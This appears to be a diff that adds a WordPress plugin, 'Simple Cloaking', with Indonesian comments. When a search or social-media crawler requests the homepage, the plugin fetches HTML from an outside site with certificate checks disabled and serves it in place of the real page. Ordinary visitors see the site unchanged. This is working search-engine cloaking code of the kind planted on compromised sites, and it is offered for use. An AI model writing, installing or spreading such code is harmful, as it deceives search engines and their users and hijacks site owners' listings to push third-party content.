@@ -1,0 +1,139 @@
+<?php
+/**
+ * Plugin Name: Simple Cloaking
+ * Plugin URI: https://example.com/
+ * Description: Simple cloaking for search engine bots
+ * Version: 1.0
+ * Author: Your Name
+ */
+
+// Cegah akses langsung
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+/**
+ * Fungsi untuk mengambil konten dari URL
+ */
+function mangsud_get_remote_content($url) {
+    // Coba dengan cURL dulu
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($httpCode === 200 && !empty($response)) {
+            return $response;
+        }
+        
+        // Log error untuk debugging
+        error_log("cURL Error: " . $error);
+    }
+    
+    // Fallback ke file_get_contents
+    if (ini_get('allow_url_fopen')) {
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => 10,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        return file_get_contents($url, false, $context);
+    }
+    
+    return false;
+}
+
+/**
+ * Hook ke early action untuk mencegah loading WordPress yang tidak perlu
+ */
+add_action('plugins_loaded', 'mangsud_check_bot', 0);
+
+function mangsud_check_bot() {
+    // Daftar bot yang akan di-cloak
+    $bot_patterns = [
+        'googlebot',
+        'bingbot',
+        'yandexbot',
+        'baiduspider',
+        'facebookexternalhit',
+        'facebot',
+        'twitterbot',
+        'slurp',        // Yahoo
+        'adsbot-google',
+        'ahrefsbot',
+        'semrushbot',
+        'mj12bot',      // Majestic
+        'rogerbot',     // Moz
+        'exabot',
+        'dotbot',
+        'telegrambot',
+        'discordbot',
+        'whatsapp',
+        'slackbot',
+        'pinterest',
+        'linkedinbot'
+    ];
+    
+    // Ambil User Agent
+    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
+    
+    // Ambil Request URI
+    $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+    
+    // Cek apakah ini bot
+    $is_bot = false;
+    foreach ($bot_patterns as $bot) {
+        if (strpos($user_agent, $bot) !== false) {
+            $is_bot = true;
+            break;
+        }
+    }
+    
+    // Cek apakah ini halaman utama
+    $is_homepage = ($request_uri === '/' || 
+                    $request_uri === '/index.php' || 
+                    $request_uri === '' || 
+                    $request_uri === '/?');
+    
+    // Jika bot mengakses homepage, lakukan cloaking
+    if ($is_bot && $is_homepage) {
+        $remote_content = mangsud_get_remote_content('https://bloomtalks.com/chia-cundinamarca/chiaa.html');
+        
+        if ($remote_content !== false) {
+            // Bersihkan semua output buffer
+            while (ob_get_level()) {
+                ob_end_clean();
+            }
+            
+            // Set header
+            header('HTTP/1.1 200 OK');
+            header('Content-Type: text/html; charset=UTF-8');
+            header('X-Robots-Tag: noindex, nofollow', true);
+            
+            // Tampilkan konten
+            echo $remote_content;
+            exit;
+        } else {
+            // Log jika gagal mengambil konten
+            error_log('Cloaking failed: Cannot fetch remote content');
+        }
+    }
+}
